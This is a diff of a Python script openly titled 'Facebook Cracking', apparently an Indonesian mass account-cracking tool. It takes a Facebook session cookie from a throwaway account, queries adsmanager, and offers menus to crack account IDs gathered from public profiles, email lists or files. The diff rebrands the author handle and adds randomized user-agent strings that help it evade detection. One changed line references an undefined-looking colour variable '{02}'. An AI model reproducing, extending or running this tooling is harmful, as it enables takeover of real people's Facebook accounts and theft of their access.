@@ -103,17 +103,18 @@ class REQ:
        self.rc = random.choice
        self.build1 = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for xc in range(6)))
        self.build2 = (''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for xc in range(8)))
-       self.app1 = f"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/{self.build1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(self.rr(55, 99))}.0.{str(self.rr(2500, 2999))}.{str(self.rr(75, 199))} Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/{str(self.rr(75, 150))}.0.0.21.71;]"
+       self.app1 = f"Mozilla/5.0 (Linux; Android 10; RMX2195 Build/{self.build1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(self.rr(55, 99))}.0.{str(self.rr(2500, 2999))}.{str(self.rr(75, 199))} Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/{str(self.rr(75, 150))}.0.0.21.71;]"
        self.app2 = f"Mozilla/5.0 (Linux; arm; Android {str(self.rr(7, 12))}; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(self.rr(75, 199))}.0.0.0 YaBrowser/{str(self.rr(20, 99))}.9.5.83.00 SA/3 Mobile Safari/537.36"
-       self.app3 = f"Mozilla/5.0 (Linux; Android 4.0.{str(self.rr(3, 4))}; Alpha GT Build/{str(self.rc(['IML74K', 'IMM76D']))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(self.rr(30, 45))}.0.{str(self.rr(1500, 2500))}.{str(self.rr(90, 150))} Mobile Safari/537.36"
+       self.app3 = f"Mozilla/5.0 (Linux; Android 10; {str(self.rr(3, 4))}; Infinix NOTE 2 LTE Build/{str(self.rc(['IML74K', 'IMM76D']))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(self.rr(30, 45))}.0.{str(self.rr(1500, 2500))}.{str(self.rr(90, 150))} Mobile Safari/537.36"
        self.app4 = f"Mozilla/5.0 (Linux; U; Android 4.2.2; ja-jp; N-06E Build/{self.build2}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
-       App_get = self.rc([self.app1, self.app2, self.app3, self.app4])
+       self.app5 = f"Mozilla/5.0 (Windows NT 10.0; {str(self.rr(3,4))}AppleWebKit/537.36(KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
+       App_get = self.rc([self.app1, self.app2, self.app3, self.app4, self.app5])
        return App_get
               
    def Logooo(self):
-       Console().print(Markdown(f"## Facebook Cracking. @AdityaExec_"),style='bold yellow')
+       Console().print(Markdown(f"## Facebook Cracking. @KalProZyy_"),style='bold yellow')
        Console().print(f' {M2}Kal {P2}Pro {O2}Zy')
-       Console().print(f'''    {H2}    ,*-~"`^"*u_                                _u*. "^`"~-*,
+       Console().print(f'''    {02}    ,*-~"`^"*u_                                _u*. "^`"~-*,
      p!^       /  jPw                            w9j \        ^!p
    w^.._      /      "\_                      _/"     \        _.^w
         *_   /          \_      _    _      _/         \     _* 
@@ -134,7 +135,7 @@ class REQ:
    def REQ_Cookie(self):
        self.clearTerminal(platform) ; self.Logooo()
        Console().print(Markdown(f"## Masukan cookie Facebook anda, pastikan anda menggunakan akun tumbal"),style='white')
-       Cooks = Console().input(f'\n>_ @AdityaExec_ : ')
+       Cooks = Console().input(f'\n>_ @KalProZyy_ : ')
        try:
            askTrue = self.ses.get('https://www.facebook.com/adsmanager/manage/campaigns',cookies = {'cookie':Cooks})
            search = re.search('act=(.*?)&nav_source',str(askTrue.content)).group(1)
@@ -183,7 +184,7 @@ class REQ:
            Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3.1) ; sys.exit()
        Console().print(Markdown(f"##### {nama} | {id}"),style='white')
        Console().print(f'\n{H2}01{P2}. Crack id dari publik\n{H2}02{P2}. Crack id dari publik massal\n{H2}03{P2}. Crack id dari email\n{H2}04{P2}. Crack id dari file\n{H2}05{P2}. Check hasil OK/CP\n{M2}00{P2}. Log-out ( Cookie )')
-       ykhh = Console().input(f'\n>_ @AdityaExec_ : ')
+       ykhh = Console().input(f'\n>_ @KalProZyy_ : ')
        
        if ykhh =='1' or ykhh =='01':
          Console().print(Markdown(f"## Masukan id target, pastikan id yang anda masukan publik"),style='blue')
